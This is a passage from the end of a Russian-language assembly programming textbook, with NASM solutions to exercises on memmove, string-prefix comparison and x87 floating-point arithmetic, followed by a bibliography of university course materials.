
     pop          edi                     ; восстанавливаем esi и edi
     pop          esi

     leave                                ; стандартный эпилог
     ret




                                                                         93
     Задача 3-13

       memmove:
          push       ebp                     ; стандартный пролог
          mov        ebp, esp

             push    esi                     ; сохраняем esi и edi,
                                             ; т.к. они нам понадобятся
             push    edi

             mov     edi, dword [ebp + 8]    ; edi := destination
             mov     esi, dword [ebp + 12]   ; esi := source
             mov     ecx, dword [ebp + 16]   ; ecx := num

             mov     eax, edi                ; должны вернуть destination

             cmp     esi, edi                ; сравниваем указатели, чтобы выбрать
                                             ; направление
             jb      .1

             cld                             ; source >= destination, копировать
                                             ; будем слева направо
             jmp     .2

       .1:
             std                             ; source < destination, копировать
                                             ; будем справа налево

             lea     esi, [esi + ecx - 1]    ; переставляем указатели на конец
                                             ; блоков
             lea     edi, [edi + ecx - 1]

       .2:
             rep     movsb                   ; выполняем побайтовое копирование

             pop     edi                     ; восстанавливаем esi и edi
             pop     esi

             leave                           ; стандартный эпилог
             ret




     Задача 3-16
     Решение для варианта задачи а):




94
  strpfx:
     push        ebp                     ; стандартный пролог
     mov         ebp, esp

        push     esi                     ; сохраняем esi и edi,
                                         ; т.к. они нам понадобятся
        push     edi

        mov      esi, dword [ebp + 8]    ; esi := s1
        mov      edi, dword [ebp + 12]   ; edi := s2

        mov      ecx, 0xffffffff         ; инициализируем ecx наибольшим числом

        cld                              ; просмотр слева направо (*)
        repe     cmpsb                   ; сравниваем побайтово, пока равно (*)

        neg      ecx                     ; ecx := n + 1, где n - длина префикса
        lea      eax, [ecx - 1]          ; готовим возвращаемое значение

        pop      edi                     ; восстанавливаем esi и edi
        pop      esi

        leave                            ; стандартный эпилог
        ret


В данном решении используется строковая команда CMPSB с префиксом повтора
(строки, помеченные звездочкой). Если строки-параметры в точности совпадают,
то организованный этой командой цикл продолжится за пределами строк, что яв-
ляется ошибкой. Для того чтобы исправить этот недостаток, чего требует вариант
б), необходимо отказаться от использования строковой команды, заменив поме-
ченные звездочкой строки на явный цикл:

 .1:
       mov      al, byte [esi]     ; явно сравниваем байты
       cmp      al, byte [edi]
       jne      .2

       test     al, al             ; проверяем на нуль-терминатор
       je       .2                 ; выходим из цикла по нуль-терминатору

       inc      esi
       inc      edi
       dec      ecx
       jmp      .1




                                                                                  95
     Задача 5-2

       extern printf, scanf

       section .rodata
          input_format db '%g', 0
          output_format db 'c = %.3f', 10, 0

       global main
       main:
          lea     ecx, [esp+4]
          and     esp, -16
          push    dword [ecx-4]
          push     ebp
          mov     ebp, esp
          push    ecx
          sub     esp, 4
          call    circumference
          add     esp, 4
          pop     ecx
          pop     ebp
          lea     esp, [ecx-4]
          ret

       circumference:
          push    ebp
          mov     ebp, esp
          sub     esp, 24

          mov     dword [esp], input_format
          lea     eax, [esp + 20]
          mov     dword [esp + 4], eax
          call    scanf
          fld     dword [esp + 20]
          fld     dword [esp + 20]
          faddp
          fldpi
          fmulp
          fstp    qword [esp + 4]
          mov     dword [esp], output_format
          call    printf

          leave
          ret


     Замечание. Приведенное решение может быть ассемблировано и выполнено. Со-
     держательная часть – функция circumference и секция .rodata.




96
Задача 5-3

  extern printf

  section .data
     _dx dq 42.0
     _dy dq 23.0
     __k dq 0.35

  section .rodata
     output_format db 'ca = %.3f', 10, 0

  global main
  main:
     lea     ecx, [esp+4]
     and     esp, -16
     push    dword [ecx-4]
     push    ebp
     mov     ebp, esp
     push    ecx
     sub     esp, 4
     call    cheba_approx
     add      esp, 4
     pop     ecx
     pop     ebp
     lea     esp, [ecx-4]
     ret

  cheba_approx:
     push    ebp
     mov     ebp, esp
     sub     esp, 24

        fld      qword [_dx]
        fld      qword [_dy]
        fucom
        fnstsw   ax
        sahf
        jc .1
        fxch
  .1:
        fld      qword [__k]
        fmulp
        faddp

        fstp     qword [esp + 4]
        mov      dword [esp], output_format
        call     printf

        leave
        ret


На стек регистров значения следует помещать в должном порядке – сверху мень-
шее, под ним большее. Тогда можно выполнить умножение верхушки стека на 0.35
и сложить результат с нижним числом. Если изначально порядок у чисел был иной
– меняем их местами.



                                                                         97
     Литература
     1.   Рэндал Э. Брайант, Дэвид О’Халларон. Компьютерные системы: архитектура
          и программирование (Computer Systems: A Programmer’s Perspective). Изда-
          тельство: БХВ-Петербург, 2005 г. — 1186 стр.

     2.   Henry S. Warren. Hacker's Delight (2nd Edition). / Addison-Wesley Professional; 2
          edition (October 5, 2012) — р. 512.

     3.   А.А. Белеванцев, С.С. Гайсарян, Л.С. Корухова, Е.А. Кузьменкова,
          В.С. Махнычев. Семинары по курсу “Алгоритмы и алгоритмические языки”
          (учебно-методическое пособие для студентов 1 курса ). М.: Издательский от-
          дел факультета ВМК МГУ имени М.В. Ломоносова.

     4.   А.А. Белеванцев, С.С. Гайсарян, В.П. Иванников, Л.С. Корухова, В.А. Падарян.
          Задачи экзаменов по вводному курсу программирования (учеб-
          но-методическое пособие). М.: Изд. отдел ф-та ВМК МГУ имени М.В. Ломо-
          носова, 2012.

     5.   К.А. Батузов, А.А. Белеванцев, Р.А. Жуйков, А.О. Кудрявцев, В.А. Падарян,
          М.А. Соловьев. Практические задачи по вводному курсу программирования
          (учебное пособие). М.: Изд. отдел ф-та ВМК МГУ имени М.В. Ломоносова,
          2012.

     6.   А.В. Столяров. Архитектура ЭВМ и системное программное обеспечение:
          язык ассемблера в ОС Unix. Часть I. / Московский государственный техниче-
          ский университет ГА, ISBN 978-5-86311-769-0, 2010.

     7.   А.В. Столяров. Программирование на языке ассемблера NASM для ОС Unix. /
          МАКС Пресс. ISBN 978-5-317-03627-0, 2011.




98
